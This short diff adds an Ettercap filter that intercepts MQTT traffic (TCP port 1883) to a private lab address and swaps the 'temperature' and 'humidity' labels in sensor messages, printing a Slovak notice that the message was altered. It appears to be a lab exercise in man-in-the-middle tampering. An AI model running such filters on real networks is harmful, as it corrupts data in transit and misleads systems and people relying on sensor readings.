@@ -1,0 +1,6 @@
+if (ip.proto == TCP && tcp.dst == 1883 && ip.dst == '192.168.137.83' && search(DATA.data, "meranie")){
+	replace("temperature","abc");
+	replace("humidity","temperature");
+	replace("abc","humidity");
+	msg("Obsah správy bol zmenený....\n");
+}
